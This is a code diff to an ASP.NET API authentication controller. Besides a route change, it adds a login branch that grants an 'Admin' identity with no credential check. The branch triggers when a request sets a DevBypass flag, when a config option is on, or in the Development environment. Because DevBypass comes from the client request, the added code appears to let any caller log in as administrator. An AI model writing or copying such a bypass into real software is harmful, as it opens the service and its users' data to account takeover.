@@ -10,7 +10,7 @@ using Microsoft.Extensions.Logging;
 namespace api.Auth;
 
 [ApiController]
-[Route("stats/[controller]")]
+[Route("stats/auth")]
 public class AuthController(
     PlayerTrackerDbContext context,
     IDiscordAuthService discordAuthService,
@@ -35,6 +35,11 @@ public class AuthController(
                 var discordPayload = await discordAuthService.ExchangeCodeForUserAsync(request.DiscordCode, request.RedirectUri, ipAddress);
                 email = discordPayload.Email;
                 name = discordPayload.Username;
+            }
+            else if (request.DevBypass == true || configuration.GetValue<bool>("Auth:AllowDevLogin") || configuration["ASPNETCORE_ENVIRONMENT"] == "Development")
+            {
+                email = "admin@bfstats.io";
+                name = "Admin";
             }
             else
             {
